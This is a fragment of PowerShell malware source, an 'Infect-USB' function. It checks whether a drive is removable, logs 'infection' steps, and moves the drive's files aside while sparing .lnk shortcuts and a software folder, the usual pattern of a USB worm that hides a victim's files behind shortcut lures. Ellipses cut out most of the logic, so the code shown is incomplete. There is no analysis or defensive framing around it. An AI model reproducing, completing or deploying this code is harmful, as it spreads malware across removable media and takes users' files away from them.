...
function Infect-USB {
    ...
    try {
        ...
        if (-not (Is-RemovableDrive -DriveLetter $DriveLetter)) {
            Add-Content -Path $logPath -Value "[$(Get-Date)] Drive $DriveLetter is not removable. Skipping infection."
            return
        }
            ...
            if ($_.FullName -ne $lnkPath -and $_.FullName -ne $usbSoftwareFolder -and $_.Extension -ne ".lnk") {
                ...
                for ($i = 0; $i -lt $retryCount; $i++) {
                    try {
                        ...
                        Add-Content -Path $logPath -Value "[$(Get-Date)] Retry $($i+1): Failed to move $($_.Name). Error: $($_.Exception.Message)"
                    }
                }
                if (-not $success) {
